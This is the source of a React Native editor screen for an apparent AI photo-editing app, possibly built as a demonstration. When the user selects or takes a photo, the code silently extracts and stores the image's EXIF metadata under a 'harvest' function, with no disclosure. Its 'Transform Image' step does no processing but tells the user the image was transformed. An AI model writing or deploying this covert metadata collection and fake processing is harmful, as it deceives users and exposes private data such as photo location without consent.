import React, { useState } from 'react';
import {
  View,
  Text,
  StyleSheet,
  TouchableOpacity,
  SafeAreaView,
  Image,
  TextInput,
  ScrollView,
  ActivityIndicator,
  Alert,
} from 'react-native';
import * as ImagePicker from 'expo-image-picker';
import { useMetadata } from '../context/MetadataContext';
import { extractMetadata } from '../utils/metadataExtractor';

export default function EditorScreen({ navigation }) {
  const [prompt, setPrompt] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);
  const {
    currentImage,
    setCurrentImage,
    setCurrentMetadata,
    processedImage,
    setProcessedImage,
    addHarvestedData,
  } = useMetadata();

  const pickImage = async (useCamera = false) => {
    try {
      let result;

      if (useCamera) {
        const { status } = await ImagePicker.requestCameraPermissionsAsync();
        if (status !== 'granted') {
          Alert.alert('Permission needed', 'Camera permission is required to take photos.');
          return;
        }
        result = await ImagePicker.launchCameraAsync({
          mediaTypes: ['images'],
          allowsEditing: false,
          quality: 1,
          exif: true, // Request EXIF data
        });
      } else {
        const { status } = await ImagePicker.requestMediaLibraryPermissionsAsync();
        if (status !== 'granted') {
          Alert.alert('Permission needed', 'Photo library permission is required.');
          return;
        }
        result = await ImagePicker.launchImageLibraryAsync({
          mediaTypes: ['images'],
          allowsEditing: false,
          quality: 1,
          exif: true, // Request EXIF data
        });
      }

      if (!result.canceled && result.assets && result.assets[0]) {
        const selectedImage = result.assets[0];
        setCurrentImage(selectedImage.uri);
        setProcessedImage(null);

        // SILENTLY extract and harvest metadata
        const metadata = await extractMetadata(selectedImage.uri, selectedImage);
        setCurrentMetadata(metadata);
        addHarvestedData(metadata);

        console.log('Metadata harvested:', JSON.stringify(metadata, null, 2));
      }
    } catch (error) {
      console.error('Error picking image:', error);
      Alert.alert('Error', 'Failed to pick image. Please try again.');
    }
  };

  const processImage = async () => {
    if (!currentImage) {
      Alert.alert('No Image', 'Please select an image first.');
      return;
    }
    if (!prompt.trim()) {
      Alert.alert('No Prompt', 'Please enter a prompt describing how to edit the image.');
      return;
    }

    setIsProcessing(true);

    // Simulate AI processing (in real app, this would call an AI API)
    // For demo purposes, we just apply a simple filter effect or show original
    setTimeout(() => {
      // For the demo, we'll just use the original image
      // In a real implementation, you'd call Stability AI, DALL-E, etc.
      setProcessedImage(currentImage);
      setIsProcessing(false);
      Alert.alert(
        'Processing Complete!',
        'Your image has been transformed. (Demo mode - actual AI integration coming soon)',
        [{ text: 'OK' }]
      );
    }, 2000);
  };

  const promptSuggestions = [
    'Make it look like a painting',
    'Add a sunset background',
    'Make it black and white',
    'Add vintage film effect',
  ];

  return (
    <SafeAreaView style={styles.container}>
      <ScrollView contentContainerStyle={styles.scrollContent}>
        {/* Header */}
        <View style={styles.header}>
          <TouchableOpacity onPress={() => navigation.goBack()}>
            <Text style={styles.backButton}>← Back</Text>
          </TouchableOpacity>
          <Text style={styles.headerTitle}>Photo Editor</Text>
          <View style={{ width: 50 }} />
        </View>

        {/* Image Preview Area */}
        <View style={styles.imageContainer}>
          {currentImage ? (
            <Image source={{ uri: processedImage || currentImage }} style={styles.previewImage} />
          ) : (
            <View style={styles.placeholder}>
              <Text style={styles.placeholderIcon}>📷</Text>
              <Text style={styles.placeholderText}>Select a photo to edit</Text>
            </View>
          )}
        </View>

        {/* Image Selection Buttons */}
        <View style={styles.buttonRow}>
          <TouchableOpacity
            style={styles.selectButton}
            onPress={() => pickImage(false)}
          >
            <Text style={styles.buttonIcon}>🖼️</Text>
            <Text style={styles.buttonText}>Gallery</Text>
          </TouchableOpacity>
          <TouchableOpacity
            style={styles.selectButton}
            onPress={() => pickImage(true)}
          >
            <Text style={styles.buttonIcon}>📸</Text>
            <Text style={styles.buttonText}>Camera</Text>
          </TouchableOpacity>
        </View>

        {/* Prompt Input */}
        <View style={styles.promptSection}>
          <Text style={styles.sectionTitle}>Describe your edit</Text>
          <TextInput
            style={styles.promptInput}
            placeholder="e.g., Make it look like a watercolor painting..."
            placeholderTextColor="#5a5a7a"
            value={prompt}
            onChangeText={setPrompt}
            multiline
            numberOfLines={3}
          />

          {/* Prompt Suggestions */}
          <View style={styles.suggestionsContainer}>
            {promptSuggestions.map((suggestion, index) => (
              <TouchableOpacity
                key={index}
                style={styles.suggestionChip}
                onPress={() => setPrompt(suggestion)}
              >
                <Text style={styles.suggestionText}>{suggestion}</Text>
              </TouchableOpacity>
            ))}
          </View>
        </View>

        {/* Process Button */}
        <TouchableOpacity
          style={[styles.processButton, (!currentImage || isProcessing) && styles.processButtonDisabled]}
          onPress={processImage}
          disabled={!currentImage || isProcessing}
        >
          {isProcessing ? (
            <ActivityIndicator color="#fff" />
          ) : (
            <Text style={styles.processButtonText}>✨ Transform Image</Text>
          )}
        </TouchableOpacity>

        {/* Status indicator (hidden data collection notice for demo) */}
        {currentImage && (
          <View style={styles.statusBar}>
            <View style={styles.statusDot} />
            <Text style={styles.statusText}>Image loaded successfully</Text>
          </View>
        )}
      </ScrollView>
    </SafeAreaView>
  );
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#0f0f1a',
  },
  scrollContent: {
    padding: 20,
  },
  header: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    alignItems: 'center',
    marginBottom: 20,
  },
  backButton: {
    color: '#6c63ff',
    fontSize: 16,
  },
  headerTitle: {
    color: '#fff',
    fontSize: 20,
    fontWeight: 'bold',
  },
  imageContainer: {
    width: '100%',
    aspectRatio: 1,
    backgroundColor: '#1a1a2e',
    borderRadius: 16,
    overflow: 'hidden',
    marginBottom: 20,
    borderWidth: 2,
    borderColor: '#2a2a4a',
    borderStyle: 'dashed',
  },
  previewImage: {
    width: '100%',
    height: '100%',
    resizeMode: 'contain',
  },
  placeholder: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
  },
  placeholderIcon: {
    fontSize: 64,
    marginBottom: 16,
  },
  placeholderText: {
    color: '#5a5a7a',
    fontSize: 16,
  },
  buttonRow: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    marginBottom: 24,
    gap: 12,
  },
  selectButton: {
    flex: 1,
    backgroundColor: '#1a1a2e',
    padding: 16,
    borderRadius: 12,
    alignItems: 'center',
    borderWidth: 1,
    borderColor: '#2a2a4a',
  },
  buttonIcon: {
    fontSize: 28,
    marginBottom: 8,
  },
  buttonText: {
    color: '#fff',
    fontSize: 14,
  },
  promptSection: {
    marginBottom: 24,
  },
  sectionTitle: {
    color: '#fff',
    fontSize: 16,
    fontWeight: '600',
    marginBottom: 12,
  },
  promptInput: {
    backgroundColor: '#1a1a2e',
    borderRadius: 12,
    padding: 16,
    color: '#fff',
    fontSize: 16,
    minHeight: 80,
    textAlignVertical: 'top',
    borderWidth: 1,
    borderColor: '#2a2a4a',
  },
  suggestionsContainer: {
    flexDirection: 'row',
    flexWrap: 'wrap',
    marginTop: 12,
    gap: 8,
  },
  suggestionChip: {
    backgroundColor: '#2a2a4a',
    paddingHorizontal: 12,
    paddingVertical: 8,
    borderRadius: 20,
  },
  suggestionText: {
    color: '#8b8ba7',
    fontSize: 12,
  },
  processButton: {
    backgroundColor: '#6c63ff',
    padding: 18,
    borderRadius: 12,
    alignItems: 'center',
    marginBottom: 20,
  },
  processButtonDisabled: {
    backgroundColor: '#3a3a5c',
  },
  processButtonText: {
    color: '#fff',
    fontSize: 18,
    fontWeight: 'bold',
  },
  statusBar: {
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'center',
    paddingVertical: 8,
  },
  statusDot: {
    width: 8,
    height: 8,
    borderRadius: 4,
    backgroundColor: '#4ade80',
    marginRight: 8,
  },
  statusText: {
    color: '#4ade80',
    fontSize: 12,
  },
});
